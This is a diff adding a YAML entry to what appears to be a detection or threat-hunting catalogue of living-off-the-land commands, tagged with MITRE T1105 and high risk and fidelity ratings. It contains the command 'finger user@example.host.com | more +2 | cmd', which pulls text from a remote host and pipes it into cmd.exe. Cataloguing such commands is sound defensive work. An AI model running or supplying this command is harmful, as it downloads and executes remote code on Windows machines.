@@ -1,0 +1,22 @@
+- command: finger user@example.host.com | more +2 | cmd
+  description: Abuse finger to connect to example.host.com for information about user named 'user' - the result could be configured to contain malicious code later executed by cmd.exe.
+  killchain:
+    - Installation
+    - Exploitation
+    - Actions on Objectives
+  mitre:
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Finger/
+    - https://twitter.com/DissectMalware/status/997340270273409024
+  risk: High
+  risk_reason: This is an extremely suspicious command that sees little normal use in IT operations.
+  fidelity: High
+  fidelity_reason: This type of commandline activity is typically rare in most organizations.
+  tool: finger
+  threatactors:
+    N/A:
+      - N/A
